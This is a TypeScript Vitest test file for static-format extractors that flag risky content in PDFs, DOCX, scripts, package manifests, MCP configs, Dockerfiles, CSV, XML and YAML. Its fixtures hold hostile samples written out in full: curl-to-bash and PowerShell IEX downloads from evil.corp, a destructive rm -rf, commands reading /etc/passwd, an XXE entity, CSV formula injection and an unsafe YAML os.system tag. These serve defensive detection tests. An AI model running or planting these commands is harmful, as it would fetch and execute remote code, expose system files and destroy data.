import { describe, it, expect } from "vitest";
import { DocumentExtractor } from "@/lib/ingestion/extractors/document-extractor";
import { CodeExtractor } from "@/lib/ingestion/extractors/code-extractor";
import { ConfigExtractor } from "@/lib/ingestion/extractors/config-extractor";
import { TextExtractor } from "@/lib/ingestion/extractors/text-extractor";
import zlib from "zlib";

describe("Milestone 8 — Static Format Extractors (Zero Execution)", () => {
  const docExtractor = new DocumentExtractor();
  const codeExtractor = new CodeExtractor();
  const configExtractor = new ConfigExtractor();
  const textExtractor = new TextExtractor();

  // ==========================================================================
  // 1. PDF Document Extractor
  // ==========================================================================
  it("extracts text and flags suspicious PDF embedded JavaScript and OpenAction directives", async () => {
    // Construct synthetic PDF with /JavaScript and /OpenAction markers
    const syntheticPdf = `
%PDF-1.7
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /Contents 5 0 R >>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert("malicious payload");) >>
endobj
5 0 obj
<< /Length 44 >>
stream
BT
/F1 12 Tf
(Security Audit Report 2026) Tj
ET
endstream
endobj
trailer
<< /Root 1 0 R >>
%%EOF
    `;

    const res = await docExtractor.extract(Buffer.from(syntheticPdf, "binary"), "audit.pdf");

    expect(res.detectedFormat).toBe("pdf");
    expect(res.extractedText).toContain("Security Audit Report 2026");
    expect(res.warnings.some((w) => w.code === "PDF_EMBEDDED_JAVASCRIPT")).toBe(true);
    expect(res.warnings.some((w) => w.code === "PDF_OPEN_ACTION_TRIGGER")).toBe(true);
    expect(res.structuredItems.length).toBeGreaterThan(0);
  });

  // ==========================================================================
  // 2. DOCX Document Extractor
  // ==========================================================================
  it("extracts paragraphs from DOCX and detects embedded VBA macro binaries", async () => {
    // Build synthetic minimal ZIP representing a DOCX with document.xml and vbaProject.bin
    const docXmlContent = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
      <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
        <w:body>
          <w:p><w:r><w:t>Confidential Executive Summary</w:t></w:r></w:p>
          <w:p><w:r><w:t>All perimeter controls active.</w:t></w:r></w:p>
        </w:body>
      </w:document>`;

    const zipBuffer = buildMockZip([
      { name: "word/document.xml", content: docXmlContent },
      { name: "word/vbaProject.bin", content: "MOCK_VBA_COMPILED_MACRO_BYTES" },
    ]);

    const res = await docExtractor.extract(zipBuffer, "executive_brief.docx");

    expect(res.detectedFormat).toBe("docx");
    expect(res.extractedText).toContain("Confidential Executive Summary");
    expect(res.extractedText).toContain("All perimeter controls active.");
    expect(res.warnings.some((w) => w.code === "DOCX_MACRO_DETECTED")).toBe(true);
  });

  // ==========================================================================
  // 3. Source Code & Script Extractor
  // ==========================================================================
  it("extracts symbols and statically flags eval, subprocess, and curl-to-shell patterns", async () => {
    const maliciousScript = `
      #!/usr/bin/env python3
      import os
      import subprocess

      def execute_remote_cmd(payload):
        # Insecure dynamic execution
        eval(payload)
        os.system("rm -rf /tmp/data")
        subprocess.Popen(["sh", "-c", payload])

      if __name__ == '__main__':
        execute_remote_cmd("test")
    `;

    const res = await codeExtractor.extract(Buffer.from(maliciousScript, "utf8"), "tool.py");

    expect(res.detectedFormat).toBe("python");
    expect(res.warnings.some((w) => w.code === "DYNAMIC_CODE_EXECUTION")).toBe(true);
    expect(res.warnings.some((w) => w.code === "SUBPROCESS_EXECUTION")).toBe(true);

    const importItems = res.structuredItems.filter((i) => i.metadata?.isImportDeclaration);
    expect(importItems.length).toBe(2);
  });

  it("detects dangerous PowerShell IEX download strings", async () => {
    const ps1Script = `
      Write-Host "Checking updates..."
      IEX (New-Object Net.WebClient).DownloadString('http://evil.corp/stage2.ps1')
    `;

    const res = await codeExtractor.extract(Buffer.from(ps1Script, "utf8"), "update.ps1");

    expect(res.detectedFormat).toBe("powershell");
    expect(res.warnings.some((w) => w.code === "POWERSHELL_PAYLOAD_DOWNLOAD")).toBe(true);
  });

  // ==========================================================================
  // 4. Config, Manifests & MCP Extractor
  // ==========================================================================
  it("flags npm package.json lifecycle postinstall script hooks", async () => {
    const packageJson = JSON.stringify({
      name: "sample-module",
      version: "1.0.0",
      scripts: {
        postinstall: "curl -s http://evil.corp/beacon | bash",
        test: "vitest run",
      },
      dependencies: {
        express: "^4.18.2",
        "unpinned-dep": "git+https://github.com/attacker/repo.git",
      },
    });

    const res = await configExtractor.extract(Buffer.from(packageJson, "utf8"), "package.json");

    expect(res.detectedFormat).toBe("dependency_manifest");
    expect(res.warnings.some((w) => w.code === "SUSPICIOUS_LIFECYCLE_SCRIPT")).toBe(true);
    expect(res.warnings.some((w) => w.code === "REMOTE_GIT_DEPENDENCY")).toBe(true);
  });

  it("audits MCP server configurations for privileged shell commands and hardcoded secrets", async () => {
    const mcpConfig = JSON.stringify({
      mcpServers: {
        system_shell: {
          command: "bash",
          args: ["-c", "cat /etc/passwd"],
          env: {
            API_SECRET_KEY: "sk-live-999988887777",
          },
        },
      },
    });

    const res = await configExtractor.extract(Buffer.from(mcpConfig, "utf8"), "mcp.json");

    expect(res.detectedFormat).toBe("mcp_definition");
    expect(res.warnings.some((w) => w.code === "PRIVILEGED_MCP_COMMAND")).toBe(true);
    expect(res.warnings.some((w) => w.code === "HARDCODED_MCP_SECRET")).toBe(true);
  });

  it("audits Dockerfiles for mutable :latest tag and explicit root user", async () => {
    const dockerfile = `
      FROM node:latest
      WORKDIR /app
      COPY . .
      USER root
      RUN npm install
      CMD ["npm", "start"]
    `;

    const res = await configExtractor.extract(Buffer.from(dockerfile, "utf8"), "Dockerfile");

    expect(res.detectedFormat).toBe("infrastructure_config");
    expect(res.warnings.some((w) => w.code === "UNPINNED_DOCKER_BASE_IMAGE")).toBe(true);
    expect(res.warnings.some((w) => w.code === "EXPLICIT_ROOT_USER_INSTRUCTION")).toBe(true);
  });

  // ==========================================================================
  // 5. Text Extractor: CSV Formula Injection, XXE & YAML
  // ==========================================================================
  it("detects CSV formula injection lead characters (=, +, -, @)", async () => {
    const csvContent = [
      "Name,Email,Amount",
      "Alice,alice@example.com,100",
      "Bob,bob@example.com,=cmd|' /C calc'!A0",
      "Charlie,charlie@example.com,@SUM(1+1)",
    ].join("\n");

    const res = await textExtractor.extract(Buffer.from(csvContent, "utf8"), "payroll.csv");

    expect(res.detectedFormat).toBe("csv");
    expect(res.warnings.filter((w) => w.code === "CSV_FORMULA_INJECTION_RISK").length).toBe(2);
  });

  it("detects XML External Entity (XXE) declarations", async () => {
    const xxeXml = `<?xml version="1.0" encoding="ISO-8859-1"?>
      <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >
      ]>
      <foo>&xxe;</foo>`;

    const res = await textExtractor.extract(Buffer.from(xxeXml, "utf8"), "data.xml");

    expect(res.detectedFormat).toBe("xml");
    expect(res.warnings.some((w) => w.code === "XXE_EXTERNAL_ENTITY_DECLARATION")).toBe(true);
  });

  it("flags unsafe custom YAML type tags", async () => {
    const unsafeYaml = `
      user: admin
      action: !!python/object/apply:os.system ["id"]
    `;

    const res = await textExtractor.extract(Buffer.from(unsafeYaml, "utf8"), "config.yaml");

    expect(res.detectedFormat).toBe("yaml");
    expect(res.warnings.some((w) => w.code === "UNSAFE_YAML_TYPE_TAG")).toBe(true);
  });
});

/**
 * Test helper to build a valid minimal PKZIP buffer in memory
 */
function buildMockZip(entries: Array<{ name: string; content: string }>): Buffer {
  const parts: Buffer[] = [];
  const centralDirParts: Buffer[] = [];
  let currentOffset = 0;

  for (const entry of entries) {
    const nameBuf = Buffer.from(entry.name, "utf8");
    const dataBuf = Buffer.from(entry.content, "utf8");

    // Local file header (30 bytes + name length)
    const localHeader = Buffer.alloc(30);
    localHeader.writeUInt32LE(0x04034b50, 0); // Local header sig
    localHeader.writeUInt16LE(20, 4); // Version needed
    localHeader.writeUInt16LE(0, 6); // Flags
    localHeader.writeUInt16LE(0, 8); // Method 0 (stored)
    localHeader.writeUInt16LE(0, 10); // Mod time
    localHeader.writeUInt16LE(0, 12); // Mod date
    localHeader.writeUInt32LE(0, 14); // CRC32 (dummy)
    localHeader.writeUInt32LE(dataBuf.length, 18); // Compressed size
    localHeader.writeUInt32LE(dataBuf.length, 22); // Uncompressed size
    localHeader.writeUInt16LE(nameBuf.length, 26); // Name length
    localHeader.writeUInt16LE(0, 28); // Extra length

    parts.push(localHeader, nameBuf, dataBuf);

    // Central directory header (46 bytes + name length)
    const cdHeader = Buffer.alloc(46);
    cdHeader.writeUInt32LE(0x02014b50, 0); // CD header sig
    cdHeader.writeUInt16LE(20, 4);
    cdHeader.writeUInt16LE(20, 6);
    cdHeader.writeUInt16LE(0, 8);
    cdHeader.writeUInt16LE(0, 10); // Method 0
    cdHeader.writeUInt16LE(0, 12);
    cdHeader.writeUInt16LE(0, 14);
    cdHeader.writeUInt32LE(0, 16);
    cdHeader.writeUInt32LE(dataBuf.length, 20);
    cdHeader.writeUInt32LE(dataBuf.length, 24);
    cdHeader.writeUInt16LE(nameBuf.length, 28);
    cdHeader.writeUInt16LE(0, 30);
    cdHeader.writeUInt16LE(0, 32);
    cdHeader.writeUInt16LE(0, 34);
    cdHeader.writeUInt16LE(0, 36);
    cdHeader.writeUInt32LE(0, 38);
    cdHeader.writeUInt32LE(currentOffset, 42); // Offset to local header

    centralDirParts.push(cdHeader, nameBuf);
    currentOffset += localHeader.length + nameBuf.length + dataBuf.length;
  }

  const centralDirBuf = Buffer.concat(centralDirParts);
  const cdOffset = currentOffset;
  const cdSize = centralDirBuf.length;

  // End of Central Directory (22 bytes)
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // EOCD sig
  eocd.writeUInt16LE(0, 4);
  eocd.writeUInt16LE(0, 6);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cdSize, 12);
  eocd.writeUInt32LE(cdOffset, 16);
  eocd.writeUInt16LE(0, 20);

  parts.push(centralDirBuf, eocd);
  return Buffer.concat(parts);
}
